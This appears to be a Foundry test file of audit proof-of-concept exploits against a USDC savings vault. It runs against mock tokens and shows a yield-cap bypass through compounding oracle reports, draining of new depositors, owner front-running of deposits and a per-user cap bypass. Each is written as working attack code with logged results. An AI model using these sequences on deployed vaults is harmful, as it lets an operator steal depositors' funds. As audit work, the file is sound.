// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {USDCSavingsVault} from "../src/USDCSavingsVault.sol";
import {VaultShare} from "../src/VaultShare.sol";
import {StrategyOracle} from "../src/StrategyOracle.sol";
import {RoleManager} from "../src/RoleManager.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";

/**
 * @title CriticalExploitPoC
 * @notice Proof of Concept demonstrating CRITICAL vulnerabilities found in independent audit
 * @dev These tests PASS to demonstrate the exploits work
 *
 * FINDINGS DEMONSTRATED:
 * - C-1: Yield Bounds Bypass via Consecutive Reports
 * - H-1: Owner Front-Running Attack
 * - M-2: Per-User Cap Bypass
 */
contract CriticalExploitPoC is Test {
    USDCSavingsVault public vault;
    VaultShare public shares;
    StrategyOracle public strategyOracle;
    RoleManager public roleManager;
    MockUSDC public usdc;

    address public owner = address(this);
    address public multisig = makeAddr("multisig");
    address public treasury = makeAddr("treasury");
    address public operator = makeAddr("operator");

    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    uint256 public constant FEE_RATE = 0.2e18;
    uint256 public constant COOLDOWN = 1 days;

    function setUp() public {
        usdc = new MockUSDC();
        roleManager = new RoleManager(owner);
        strategyOracle = new StrategyOracle(address(roleManager));

        vault = new USDCSavingsVault(
            address(usdc),
            address(strategyOracle),
            address(roleManager),
            multisig,
            treasury,
            FEE_RATE,
            COOLDOWN,
            "USDC Savings Vault Share",
            "svUSDC"
        );
        shares = vault.shares();
        roleManager.setOperator(operator, true);
        strategyOracle.setVault(address(vault));

        // Keep funds in vault for testing
        vault.setWithdrawalBuffer(type(uint256).max);

        // Fund users
        usdc.mint(attacker, 10_000_000e6);
        usdc.mint(victim, 10_000_000e6);
        usdc.mint(multisig, 100_000_000e6);

        vm.prank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(multisig);
        usdc.approve(address(vault), type(uint256).max);
    }

    // ============================================================
    // C-1: CRITICAL - Yield Bounds Bypass via Consecutive Reports
    // ============================================================

    /**
     * @notice Demonstrates that yield bounds (10%) can be bypassed via consecutive reports
     * @dev The owner can inflate NAV by 159%+ in a single block, despite 10% limit
     */
    function test_C1_YieldBoundsCompoundBypass() public {
        console2.log("=== C-1: YIELD BOUNDS BYPASS EXPLOIT ===");
        console2.log("");

        // Victim deposits 1M USDC
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        uint256 navBefore = vault.totalAssets();
        uint256 priceBefore = vault.sharePrice();

        console2.log("Initial state:");
        console2.log("  NAV:", navBefore / 1e6, "USDC");
        console2.log("  Share price:", priceBefore);
        console2.log("  Max yield per report: 10%");
        console2.log("");

        // Owner makes 10 consecutive yield reports in the SAME BLOCK
        // Each report is 10% of CURRENT NAV, which compounds
        console2.log("Owner making 10 consecutive 10% yield reports...");

        for (uint256 i = 0; i < 10; i++) {
            uint256 currentNav = vault.totalAssets();
            int256 maxAllowedYield = int256((currentNav * 10) / 100); // 10% of current NAV
            strategyOracle.reportYield(maxAllowedYield);
        }

        uint256 navAfter = vault.totalAssets();
        uint256 priceAfter = vault.sharePrice();
        uint256 inflationPercent = ((navAfter - navBefore) * 100) / navBefore;

        console2.log("");
        console2.log("After attack:");
        console2.log("  NAV:", navAfter / 1e6, "USDC");
        console2.log("  Share price:", priceAfter);
        console2.log("  Inflation:", inflationPercent, "%");
        console2.log("");

        // EXPLOIT SUCCESSFUL: NAV inflated by ~159%, far exceeding "10% limit"
        assertGt(inflationPercent, 150, "EXPLOIT: NAV should inflate >150%");
        assertGt(priceAfter, priceBefore * 2, "EXPLOIT: Price should >2x");

        console2.log("EXPLOIT SUCCESSFUL!");
        console2.log("10% limit bypassed - actual inflation:", inflationPercent, "%");
        console2.log("");
        console2.log("Expected: 1.1^10 = 2.59x = 159% inflation");
        console2.log("This matches theoretical prediction.");
    }

    /**
     * @notice Shows owner can drain value from new depositors via yield manipulation
     */
    function test_C1_OwnerDrainsNewDepositors() public {
        console2.log("=== C-1 VARIANT: OWNER DRAINS NEW DEPOSITORS ===");
        console2.log("");

        // Initial depositor
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        // Owner inflates NAV massively
        for (uint256 i = 0; i < 10; i++) {
            uint256 nav = vault.totalAssets();
            strategyOracle.reportYield(int256(nav / 10));
        }

        uint256 inflatedPrice = vault.sharePrice();
        console2.log("Inflated share price:", inflatedPrice);

        // New victim deposits at inflated price
        address newVictim = makeAddr("newVictim");
        usdc.mint(newVictim, 1_000_000e6);
        vm.startPrank(newVictim);
        usdc.approve(address(vault), type(uint256).max);
        uint256 newVictimShares = vault.deposit(1_000_000e6);
        vm.stopPrank();

        console2.log("New victim deposited 1M USDC");
        console2.log("New victim received shares:", newVictimShares);

        // Owner deflates NAV back
        for (uint256 i = 0; i < 10; i++) {
            uint256 nav = vault.totalAssets();
            strategyOracle.reportYield(-int256(nav / 11)); // ~9% loss each time
        }

        uint256 deflatedPrice = vault.sharePrice();
        console2.log("Deflated share price:", deflatedPrice);

        // New victim's value was drained
        uint256 newVictimValue = vault.sharesToUsdc(newVictimShares);
        console2.log("New victim's remaining value:", newVictimValue / 1e6, "USDC");
        console2.log("New victim LOST:", (1_000_000e6 - newVictimValue) / 1e6, "USDC");

        // Original victim benefits from the attack
        uint256 originalVictimValue = vault.sharesToUsdc(shares.balanceOf(victim));
        console2.log("Original depositor value:", originalVictimValue / 1e6, "USDC");

        assertLt(newVictimValue, 600_000e6, "New victim should lose >40% of value");
    }

    // ============================================================
    // H-1: HIGH - Owner Front-Running Attack
    // ============================================================

    /**
     * @notice Demonstrates owner can front-run deposits to extract value
     */
    function test_H1_OwnerFrontRunsDeposits() public {
        console2.log("=== H-1: OWNER FRONT-RUNNING EXPLOIT ===");
        console2.log("");

        // Initial deposit to establish shares
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        uint256 priceBefore = vault.sharePrice();
        console2.log("Price before victim2 deposit:", priceBefore);

        // Simulate: Owner sees victim2's 100k deposit in mempool
        address victim2 = makeAddr("victim2");
        usdc.mint(victim2, 100_000e6);

        // Owner front-runs with yield report (inflates price)
        strategyOracle.reportYield(100_000e6); // 10% yield

        uint256 priceAfterFrontrun = vault.sharePrice();
        console2.log("Price after owner front-run:", priceAfterFrontrun);

        // Victim2's deposit executes at inflated price
        vm.startPrank(victim2);
        usdc.approve(address(vault), type(uint256).max);
        uint256 victim2Shares = vault.deposit(100_000e6);
        vm.stopPrank();

        // Compare to fair shares they should have received
        uint256 fairShares = (100_000e6 * 1e18) / priceBefore;

        console2.log("Victim2 shares received:", victim2Shares);
        console2.log("Fair shares (no frontrun):", fairShares);
        console2.log("Shares lost to frontrun:", fairShares - victim2Shares);

        // Value extracted
        uint256 valueLost = vault.sharesToUsdc(fairShares - victim2Shares);
        console2.log("Value extracted by owner:", valueLost / 1e6, "USDC");

        assertLt(victim2Shares, fairShares, "Victim should receive fewer shares due to frontrun");
    }

    // ============================================================
    // M-2: MEDIUM - Per-User Cap Bypass
    // ============================================================

    /**
     * @notice Demonstrates per-user cap can be easily bypassed
     */
    function test_M2_PerUserCapBypass() public {
        console2.log("=== M-2: PER-USER CAP BYPASS ===");
        console2.log("");

        // Set 100k per-user cap
        vault.setPerUserCap(100_000e6);
        console2.log("Per-user cap set to: 100,000 USDC");

        // Attacker deposits to cap
        vm.prank(attacker);
        vault.deposit(100_000e6);
        console2.log("Attacker deposited 100k (at cap)");

        // Verify attacker is at cap
        vm.prank(attacker);
        vm.expectRevert(USDCSavingsVault.ExceedsUserCap.selector);
        vault.deposit(1e6);
        console2.log("Attacker blocked from additional deposit (expected)");

        // BYPASS: Transfer shares to second wallet
        address attackerWallet2 = makeAddr("attackerWallet2");
        vm.prank(attacker);
        shares.transfer(attackerWallet2, shares.balanceOf(attacker));
        console2.log("Attacker transferred all shares to wallet2");

        // Now attacker can deposit again!
        vm.prank(attacker);
        vault.deposit(100_000e6);
        console2.log("Attacker deposited ANOTHER 100k (bypassed cap!)");

        // Transfer back
        vm.prank(attackerWallet2);
        shares.transfer(attacker, shares.balanceOf(attackerWallet2));

        // Total holdings
        uint256 attackerTotalValue = vault.sharesToUsdc(shares.balanceOf(attacker));
        console2.log("Attacker total position:", attackerTotalValue / 1e6, "USDC");

        assertGt(attackerTotalValue, 190_000e6, "Attacker should have >190k despite 100k cap");
        console2.log("");
        console2.log("EXPLOIT SUCCESSFUL: 100k cap bypassed, attacker has 200k position");
    }

    // ============================================================
    // BONUS: Combined Attack Scenario
    // ============================================================

    /**
     * @notice Full attack scenario combining multiple vulnerabilities
     */
    function test_COMBINED_FullAttackScenario() public {
        console2.log("=== COMBINED ATTACK SCENARIO ===");
        console2.log("");

        // Phase 1: Victim deposits
        vm.prank(victim);
        vault.deposit(1_000_000e6);
        console2.log("Phase 1: Victim deposits 1M USDC");

        // Phase 2: Malicious owner inflates NAV before their own deposit
        console2.log("Phase 2: Owner manipulating NAV...");
        // First deflate to buy cheap
        strategyOracle.reportYield(-90_000e6);

        // Owner (attacker in this case) deposits at low price
        usdc.mint(owner, 100_000e6);
        usdc.approve(address(vault), type(uint256).max);
        uint256 ownerShares = vault.deposit(100_000e6);
        console2.log("  Owner deposited 100k at deflated price");
        console2.log("  Owner received shares:", ownerShares);

        // Phase 3: Inflate massively
        console2.log("Phase 3: Owner inflating NAV...");
        for (uint256 i = 0; i < 10; i++) {
            uint256 nav = vault.totalAssets();
            strategyOracle.reportYield(int256(nav / 10));
        }

        // Phase 4: Check results
        uint256 ownerValue = vault.sharesToUsdc(ownerShares);
        uint256 victimValue = vault.sharesToUsdc(shares.balanceOf(victim));

        console2.log("");
        console2.log("Final Results:");
        console2.log("  Owner deposited: 100,000 USDC");
        console2.log("  Owner current value:", ownerValue / 1e6, "USDC");
        console2.log("  Owner profit:", (ownerValue - 100_000e6) / 1e6, "USDC");
        console2.log("");
        console2.log("  Victim deposited: 1,000,000 USDC");
        console2.log("  Victim current value:", victimValue / 1e6, "USDC");

        // Owner extracted massive profit via NAV manipulation
        assertGt(ownerValue, 200_000e6, "Owner should have >2x profit");
    }
}
